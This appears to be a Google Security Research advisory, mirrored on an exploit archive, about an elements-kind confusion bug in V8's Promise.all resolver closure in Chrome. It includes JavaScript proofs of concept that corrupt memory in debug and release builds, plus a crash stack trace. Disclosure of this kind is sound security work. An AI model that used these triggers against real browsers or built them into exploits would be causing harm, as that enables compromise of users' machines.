@@ -1,0 +1,79 @@
+id: 30570
+date: 06/11/2018
+title: Chrome V8 PromiseAllResolveElementClosure Element Confusion Vulnerability
+author: Google Security Research
+cves: 
+
+Chrome: V8: PromiseAllResolveElementClosure can cause elements kind confusion 
+
+
+
+
+The Promise.all method internally uses PromiseAllResolveElementClosure (<a href="https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-promise-gen.cc?rcl=dc2d3bb9711effb349df58af26c49169aa019121&l=1910" title="" class="" rel="nofollow">https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-promise-gen.cc?rcl=dc2d3bb9711effb349df58af26c49169aa019121&l=1910</a>) as a resolver for each of given Promise objects to insert a value into the result array at a specific index.
+
+PromiseAllResolveElementClosure first tries to grow the capacity of the result array, and if it fails due to the index being too large, it uses the CreateDataProperty method to insert the value. The problem is, the growing operation (<a href="https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-promise-gen.cc?rcl=dc2d3bb9711effb349df58af26c49169aa019121&l=1933" title="" class="" rel="nofollow">https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-promise-gen.cc?rcl=dc2d3bb9711effb349df58af26c49169aa019121&l=1933</a>) always excepts the elements kind of the array to be PACKED_ELEMENTS despite the CreateDataProperty can transition it to DICTIONARY_ELEMENTS.
+
+PoC with comments:
+let arr = new Array(0x10000);
+let resolve_element_closures = new Array(0x10000);
+
+for (let i = 0; i < arr.length; i++) {
+    arr[i] = new Promise(() => {});
+    arr[i].then = ((idx, resolve) => {
+        resolve_element_closures[idx] = resolve;
+    }).bind(null, i);
+}
+
+Promise.all(arr);
+
+// 0xffff is too large, transitions to DICTIONARY_ELEMENTS
+resolve_element_closures[0xffff]();
+
+// grows the capacity, the elements kind of the result array is still DICTIONARY_ELEMENTS, but the elements object of it is no more a dictionary.
+resolve_element_closures[100]();
+
+// You can observe that V8 crashes here in debug mode.
+resolve_element_closures[0xfffe]();
+
+PoC for release mode:
+var promise = new Promise(() => {})
+promise.then = function (cb) {
+    cb();
+};
+
+let arr = new Array(0x10000);
+arr.fill(0);
+arr[arr.length - 1] = promise;
+
+Promise.all(arr);
+
+
+Crash log:
+#
+# Fatal error in ../../src/objects-inl.h, line 2814
+# Debug check failed: fixed_array->IsDictionary().
+#
+#
+#
+#FailureMessage Object: 0x7f122141d860
+==== C stack trace ===============================
+
+    ./d8(__interceptor_backtrace+0x61) [0x561ea9b7c0e1]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7f122c26dcee]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8_libplatform.so(+0x6b924) [0x7f122c19f924]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x3a4) [0x7f122c2351e4]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8_libbase.so(+0x557e7) [0x7f122c2347e7]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x32) [0x7f122c235332]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8.so(v8::internal::JSObject::GetElementsKind()+0x25b) [0x7f12280f7f6b]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8.so(v8::internal::JSObject::GetElementsAccessor()+0x15) [0x7f122a146185]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8.so(v8::internal::LookupIterator::State v8::internal::LookupIterator::LookupInRegularHolder<true>(v8::internal::Map*, v8::internal::JSReceiver*)+0x20e) [0x7f122a02082e]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8.so(v8::internal::LookupIterator::State v8::internal::LookupIterator::LookupInHolder<true>(v8::internal::Map*, v8::internal::JSReceiver*)+0x5c) [0x7f122a01b90c]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8.so(void v8::internal::LookupIterator::Start<true>()+0x212) [0x7f122a01b772]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8.so(v8::internal::LookupIterator::LookupIterator(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, unsigned int, v8::internal::Handle<v8::internal::JSReceiver>, v8::internal::LookupIterator::Configuration)+0x6da) [0x7f1227c8151a]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8.so(v8::internal::LookupIterator::LookupIterator(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, unsigned int, v8::internal::LookupIterator::Configuration)+0x2ee) [0x7f1227c8073e]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8.so(v8::internal::LookupIterator::PropertyOrElement(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, bool*, v8::internal::LookupIterator::Configuration)+0x547) [0x7f122a007d07]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8.so(+0x4833085) [0x7f122a9a8085]
+    /home/lokihardt/debug/v8/out.gn/x64.debug/./libv8.so(v8::internal::Runtime_CreateDataProperty(int, v8::internal::Object**, v8::internal::Isolate*)+0x30f) [0x7f122a9a6f2f]
+    [0x7efc88a04584]
+
+#  0day.today [2023-03-26]  #
